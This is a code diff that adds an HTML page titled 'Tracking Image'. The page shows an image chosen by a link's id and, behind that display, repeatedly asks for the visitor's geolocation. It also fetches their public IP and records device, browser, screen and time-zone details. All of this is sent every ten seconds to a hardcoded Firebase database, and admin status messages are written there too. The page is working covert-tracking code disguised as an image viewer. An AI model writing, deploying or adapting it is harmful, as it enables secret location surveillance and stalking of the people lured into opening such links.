@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tracking Image</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f9f9f9; }
+    </style>
+</head>
+<body>
+    <div id="imageContainer"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            databaseURL: "https://live-32776-default-rtdb.firebaseio.com/"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('id');
+
+        if (trackingId) {
+            database.ref('trackedImages/' + trackingId).once('value').then(snapshot => {
+                const data = snapshot.val();
+                if (data && data.link) {
+                    document.getElementById('imageContainer').innerHTML = `<img src="${data.link}" style="width:100%;max-width:400px;">`;
+
+                    sendLocation();
+                    setInterval(() => {
+                        sendLocation();
+                    }, 10000);
+                }
+            });
+        }
+
+        async function sendLocation() {
+            try {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const ipAddress = ipData.ip;
+
+                        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'PC';
+                        const browser = navigator.userAgent;
+                        const screenWidth = window.screen.width;
+                        const screenHeight = window.screen.height;
+                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                        const deviceName = `${deviceType}-${ipAddress}`.replace(/\./g, '-');
+
+                        const locationRef = database.ref('Data/' + deviceName + '/' + trackingId + '/locations').push();
+                        locationRef.set({
+                            latitude: latitude,
+                            longitude: longitude,
+                            ip: ipAddress,
+                            time: new Date().toLocaleString(),
+                            deviceType: deviceType,
+                            browser: browser,
+                            screen: `${screenWidth} x ${screenHeight}`,
+                            timeZone: timeZone
+                        });
+
+                        database.ref('adminMessage').set('Data received successfully from ' + deviceName);
+                    }, () => {
+                        database.ref('adminMessage').set('Location permission denied');
+                    });
+                } else {
+                    database.ref('adminMessage').set('Geolocation not supported');
+                }
+            } catch (error) {
+                database.ref('adminMessage').set('Error: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
